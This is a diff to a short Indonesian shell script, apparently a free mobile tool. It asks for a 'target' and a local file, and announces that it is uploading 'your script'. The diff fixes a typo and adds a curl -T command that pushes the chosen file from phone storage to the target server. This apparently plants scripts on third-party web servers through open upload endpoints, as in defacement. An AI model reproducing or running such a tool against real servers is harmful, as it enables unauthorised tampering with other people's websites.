@@ -21,13 +21,13 @@ read nick #membaca tulisan masuk
         echo  "############################№#############################################################"
          echo "######################################№№#################################################"
 echo "selamat datang di tools ini" $nick
-echo "tunggg bentarrr................."
+echo "tunggu bentarrr................."
 echo "masukkan target kamu : "
 read target #target
 echo "input file kamu :"
 read file #file
 echo "tunggu bentar ya tod w lagi apluod scrpit lu...."
- 
+ curl -T /storage/emulated/0/$file $target
 clear
 echo "==================================="
 echo " Tools ini gratis"
